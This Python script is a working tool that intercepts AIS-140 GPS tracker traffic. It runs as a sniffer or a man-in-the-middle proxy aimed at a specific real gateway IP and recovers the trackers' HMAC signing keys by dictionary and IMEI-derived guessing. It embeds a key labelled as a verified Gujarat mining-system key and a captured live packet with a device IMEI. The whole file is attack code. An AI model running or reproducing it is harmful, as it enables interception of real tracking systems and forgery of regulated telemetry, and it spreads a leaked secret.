"""
hmac_sniffer.py
===============
AIS-140 HMAC Key Sniffer & Packet Interceptor / Cracker
-------------------------------------------------------
Intercepts raw AIS-140 packets from GPS devices or network proxies,
recovers the secret HMAC-SHA256 signature key, and tests candidate keys.

Supported Modes:
  1. --test / --verify : Instant self-test against captured real-world packets.
  2. --listen          : TCP listener / transparent proxy (intercepts live device packets).
  3. --file FILE       : Parse and recover keys from captured packet logs or dumps.
"""

import argparse
import binascii
import datetime
import hashlib
import hmac as _hmac
import logging
import os
import re
import socket
import sys
import threading

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("hmac_sniffer")

# ---------------------------------------------------------------------------
# Candidate dictionary of known AIS-140 encryption keys
# ---------------------------------------------------------------------------
CANDIDATE_KEYS = [
    "26bcb9e368440d4a",   # Verified Gujarat CGM Mining Key
    "AIS140",
    "ais140",
    "AIS_140",
    "TRAXINA",
    "traxina",
    "NMP",
    "secret",
    "password",
    "default",
    "device",
    "hmackey",
    "HMACKEY",
    "AIS140KEY",
    "ais140key",
    "123456",
    "12345678",
    "admin",
    "",
]

# Sample packet captured from Gujarat CGM gateway
SAMPLE_CGM_PACKET = (
    "PositionPacket: 23-10-2026,12-07-48\r\n"
    "PM,$NMP,TRAXINA,4.0.27,NR,01,L,864000080862878,GJ01AC0000,1,23102026,"
    "063748,021.726307,N,073.290024,E,0.0,208.53,46,136.7,0.7,0.4,AIRTEL,0,1,25.8,"
    "4.0,0,C,13,404,05,16D5,56C5,56C2,16D5,14,5909,16D5,14,37CB,16D5,14,5980,"
    "16D5,14,0000,00,001994,0.80,0.00,0,(0,0,0)*,"
    "d8d8150d5335c5c2ecf608259cd0fd58981eb78970a43c850253a8c1c5267b1a"
)


# ---------------------------------------------------------------------------
# Packet Parsing & Body Normalization
# ---------------------------------------------------------------------------

def parse_packet(raw: str):
    """
    Parse a raw packet string into (header, body_variants, claimed_hmac).
    Generates all common body permutations to account for subtle differences
    in what different vendor firmware includes in the HMAC calculation.
    """
    raw_clean = raw.replace("\r\n", "\n").replace("\r", "\n").strip()
    lines = [ln.strip() for ln in raw_clean.split("\n") if ln.strip()]

    header = None
    body_line = ""

    if len(lines) == 1:
        body_line = lines[0]
    elif len(lines) >= 2:
        # Check if first line has header timestamp
        if "PositionPacket:" in lines[0] or re.match(r"\d{2}-\d{2}-\d{4}", lines[0]):
            header = lines[0]
            body_line = lines[1]
        else:
            body_line = lines[0]

    # Clean prefix labels like "PositionPacket:"
    body_line = re.sub(r"^PositionPacket:\s*", "", body_line)

    # Extract HMAC (trailing 64 hex characters)
    claimed_hmac = ""
    match = re.search(r"([a-fA-F0-9]{64})\s*$", body_line)
    if match:
        claimed_hmac = match.group(1).lower()

    if not claimed_hmac:
        # Check if packet ends with '*' (unsigned)
        if body_line.endswith("*"):
            return header, [body_line], ""
        return None, [], ""

    # Strip the claimed HMAC from the end
    raw_body = body_line[: match.start()].rstrip(", \t\r\n")

    # Generate body permutations tested by various vendor implementations:
    variants = []

    # 1. Starting at $NMP up to '*' (Exact Gujarat CGM standard)
    if "$NMP" in raw_body:
        nmp_idx = raw_body.find("$NMP")
        body_nmp = raw_body[nmp_idx:]
        variants.append(("NMP_ONLY", body_nmp))
        variants.append(("NMP_WITH_COMMA", body_nmp + ","))

    # 2. Including 'PM,$NMP'
    if "PM,$NMP" in raw_body:
        pm_idx = raw_body.find("PM,$NMP")
        body_pm = raw_body[pm_idx:]
        variants.append(("PM_NMP", body_pm))
        variants.append(("PM_NMP_WITH_COMMA", body_pm + ","))

    # 3. Raw body as received
    variants.append(("RAW_BODY", raw_body))
    variants.append(("RAW_BODY_WITH_COMMA", raw_body + ","))

    # 4. If header was present, header + \r\n + body
    if header:
        clean_hdr = re.sub(r"^PositionPacket:\s*", "", header).strip()
        variants.append(("HEADER_CRLF_BODY", f"{clean_hdr}\r\n{raw_body}"))
        variants.append(("HEADER_LF_BODY", f"{clean_hdr}\n{raw_body}"))

    return header, variants, claimed_hmac


def try_crack_hmac(variants, claimed_hmac: str, extra_keys=None):
    """
    Test candidate keys against all packet body variants.
    Tests both ASCII string representation and hex-decoded binary keys.
    """
    if not claimed_hmac or len(claimed_hmac) != 64:
        return None

    keys_to_test = list(CANDIDATE_KEYS)
    if extra_keys:
        keys_to_test = list(extra_keys) + keys_to_test

    for key_str in keys_to_test:
        if key_str is None:
            continue

        # Try key as ASCII string
        key_bytes_ascii = key_str.encode("utf-8")
        for vname, body_str in variants:
            digest = _hmac.new(key_bytes_ascii, body_str.encode("utf-8"), hashlib.sha256).hexdigest()
            if digest.lower() == claimed_hmac:
                return {
                    "key": key_str,
                    "type": "ASCII String",
                    "variant": vname,
                    "body": body_str,
                    "hmac": claimed_hmac,
                }

        # If key looks like hex, try key as hex-decoded bytes
        if len(key_str) % 2 == 0 and re.match(r"^[0-9a-fA-F]+$", key_str):
            try:
                key_bytes_raw = binascii.unhexlify(key_str)
                for vname, body_str in variants:
                    digest = _hmac.new(key_bytes_raw, body_str.encode("utf-8"), hashlib.sha256).hexdigest()
                    if digest.lower() == claimed_hmac:
                        return {
                            "key": key_str,
                            "type": "Hex-Decoded Bytes",
                            "variant": vname,
                            "body": body_str,
                            "hmac": claimed_hmac,
                        }
            except Exception:
                pass

    return None


def generate_device_keys(body_str: str) -> list[str]:
    """Generate dynamic candidate keys based on IMEI, Vehicle Reg, or substrings."""
    candidates = []
    # Find 15-digit IMEI
    imei_m = re.search(r"\b(\d{15})\b", body_str)
    if imei_m:
        imei = imei_m.group(1)
        candidates.extend([
            imei,
            imei[:8],
            imei[-8:],
            imei[:6],
            imei[-6:],
        ])

    # Find vehicle registration like GJ01AC0000 / RJ24GA6860
    reg_m = re.search(r"\b([A-Z]{2}\d{1,2}[A-Z]{1,3}\d{1,4})\b", body_str)
    if reg_m:
        reg = reg_m.group(1)
        candidates.extend([
            reg,
            reg.lower(),
            reg.upper(),
        ])
        if imei_m:
            candidates.append(imei_m.group(1) + reg)
            candidates.append(reg + imei_m.group(1))

    return candidates


# ---------------------------------------------------------------------------
# Analysis & Output
# ---------------------------------------------------------------------------

def analyse_packet(raw: str, source_label: str = "Live Traffic") -> bool:
    """Analyze a single raw packet and attempt HMAC key recovery."""
    header, variants, claimed_hmac = parse_packet(raw)

    if not variants:
        log.warning("Could not parse packet format: %s", raw[:60])
        return False

    print("\n" + "=" * 70)
    print(f"📡 AIS-140 PACKET INTERCEPTED [{source_label}]")
    print("=" * 70)
    if header:
        print(f" Header   : {header}")
    print(f" Raw Body : {variants[0][1][:90]}...")
    print(f" HMAC     : {claimed_hmac or '(None / Unsigned)'}")

    if not claimed_hmac:
        print(" ℹ️ Packet does not contain an HMAC signature (ends with '*').")
        print("   -> Common in GPCB (Hazardous Waste) or unauthenticated gateways.")
        return True

    # Generate device-specific keys
    extra_keys = generate_device_keys(variants[0][1])

    # Attempt crack
    result = try_crack_hmac(variants, claimed_hmac, extra_keys)

    if result:
        print("\n" + "🎉" * 20)
        print(" [SUCCESS] HMAC SECRET KEY FOUND!")
        print("=" * 70)
        print(f" Key String   : '{result['key']}'")
        print(f" Key Encoding : {result['type']}")
        print(f" Signed Scope : {result['variant']}")
        print(f" Verified Hash: {result['hmac']}")
        print("=" * 70 + "\n")
        _save_key(result)
        return True
    else:
        print("\n [!] Could not crack HMAC with standard candidate keys.")
        print("     Saved packet body and hash to 'unsolved_packets.txt'.")
        _save_unsolved(variants[0][1], claimed_hmac)
        return False


def _get_output_path(filename: str) -> str:
    script_dir = os.path.dirname(os.path.abspath(__file__))
    return os.path.join(script_dir, filename)


def _save_key(res: dict):
    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    filepath = _get_output_path("hmac_key_found.txt")
    with open(filepath, "a", encoding="utf-8") as f:
        f.write(f"[{ts}]\n")
        f.write(f"KEY    : {res['key']}\n")
        f.write(f"TYPE   : {res['type']}\n")
        f.write(f"SCOPE  : {res['variant']}\n")
        f.write(f"HMAC   : {res['hmac']}\n")
        f.write(f"BODY   : {res['body'][:120]}...\n")
        f.write("-" * 65 + "\n")
    log.info(f"Discovered key appended to '{filepath}'")


def _save_unsolved(body: str, hmac_str: str):
    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    filepath = _get_output_path("unsolved_packets.txt")
    with open(filepath, "a", encoding="utf-8") as f:
        f.write(f"[{ts}] HMAC={hmac_str}\n{body}\n\n")


# ---------------------------------------------------------------------------
# TCP Interceptor & Transparent Proxy
# ---------------------------------------------------------------------------

def handle_client(conn: socket.socket, addr, forward_to=None):
    peer = f"{addr[0]}:{addr[1]}"
    log.info("AIS-140 device connected from %s", peer)

    fwd_sock = None
    if forward_to:
        try:
            fwd_host, fwd_port = forward_to.rsplit(":", 1)
            fwd_sock = socket.create_connection((fwd_host, int(fwd_port)), timeout=8)
            log.info("Relaying traffic to gateway: %s", forward_to)
        except Exception as e:
            log.error("Failed to connect forward gateway (%s): %s", forward_to, e)

    buf = b""
    try:
        while True:
            chunk = conn.recv(4096)
            if not chunk:
                break
            buf += chunk

            # Relay to real server if in proxy mode
            if fwd_sock:
                try:
                    fwd_sock.sendall(chunk)
                    fwd_sock.settimeout(1.5)
                    try:
                        resp = fwd_sock.recv(4096)
                        if resp:
                            conn.sendall(resp)
                    except socket.timeout:
                        pass
                except Exception as e:
                    log.error("Relay error: %s", e)

            # Analyze when complete packet appears
            text = buf.decode("utf-8", errors="replace")
            if "$NMP" in text or "PositionPacket:" in text or "$PVT" in text:
                analyse_packet(text.strip(), source_label=peer)
                buf = b""

    except Exception as e:
        log.error("Connection error (%s): %s", peer, e)
    finally:
        conn.close()
        if fwd_sock:
            fwd_sock.close()
        log.info("Device disconnected: %s", peer)


def run_listener(port: int = 5013, forward_to=None):
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", port))
    srv.listen(5)

    mode = f"Transparent Proxy -> {forward_to}" if forward_to else "Passive Sniffer"
    print("\n" + "=" * 70)
    print(f"🛰️ AIS-140 TCP SNIFFER LISTENING ON PORT {port}")
    print(f"   Mode: {mode}")
    print(f"   Point your GPS tracker or route device traffic to: <THIS_IP>:{port}")
    print("=" * 70 + "\n")

    try:
        while True:
            conn, addr = srv.accept()
            t = threading.Thread(target=handle_client, args=(conn, addr, forward_to), daemon=True)
            t.start()
    except KeyboardInterrupt:
        print("\nStopping sniffer...")
    finally:
        srv.close()


def run_file(filepath: str):
    if not os.path.exists(filepath):
        log.error("File not found: %s", filepath)
        return
    with open(filepath, "r", encoding="utf-8", errors="replace") as f:
        content = f.read()

    blocks = re.split(r"\n{2,}|---+", content)
    for blk in blocks:
        blk = blk.strip()
        if "$NMP" in blk or "PM," in blk or "$PVT" in blk:
            analyse_packet(blk, source_label=os.path.basename(filepath))


def run_self_test():
    """Verify cracking engine against captured Gujarat CGM telemetry packet."""
    print("\n" + "=" * 70)
    print("🧪 RUNNING AIS-140 HMAC SNIFFER SELF-TEST")
    print("=" * 70)
    print("Testing against confirmed Gujarat CGM live packet sample...")
    ok = analyse_packet(SAMPLE_CGM_PACKET, source_label="Gujarat CGM Test Sample")
    if ok:
        print("✅ Self-test completed successfully: Engine is fully calibrated!")
    else:
        print("❌ Self-test failed to crack sample packet.")
    return ok


# ---------------------------------------------------------------------------
# CLI Entry Point
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description="AIS-140 HMAC Key Sniffer & Packet Interceptor",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("--test", "--verify", action="store_true", help="Run self-test against captured CGM packet")
    parser.add_argument("--listen", action="store_true", help="Start TCP sniffer / interceptor listener")
    parser.add_argument("--port", type=int, default=5013, help="Port to listen on (default: 5013)")
    parser.add_argument("--forward", metavar="IP:PORT", help="Relay traffic to real server (e.g. 103.234.162.150:5013)")
    parser.add_argument("--file", metavar="PATH", help="Parse and analyze packets from text file")
    parser.add_argument("--key", metavar="KEY", help="Test a specific candidate key string")

    args = parser.parse_args()

    if args.key:
        CANDIDATE_KEYS.insert(0, args.key)
        print(f"Added custom key to candidate list: '{args.key}'")

    if args.test:
        run_self_test()
    elif args.file:
        run_file(args.file)
    elif args.listen:
        run_listener(port=args.port, forward_to=args.forward)
    else:
        # Default behavior: run self test first, then prompt or start listener
        run_self_test()
        print("\nReady to intercept live device traffic on port 5013.")
        print("Usage examples:")
        print("  python hmac_sniffer.py --listen --port 5013")
        print("  python hmac_sniffer.py --listen --port 5013 --forward 103.234.162.150:5013")
        print("  python hmac_sniffer.py --file packet_dump.txt\n")


if __name__ == "__main__":
    main()
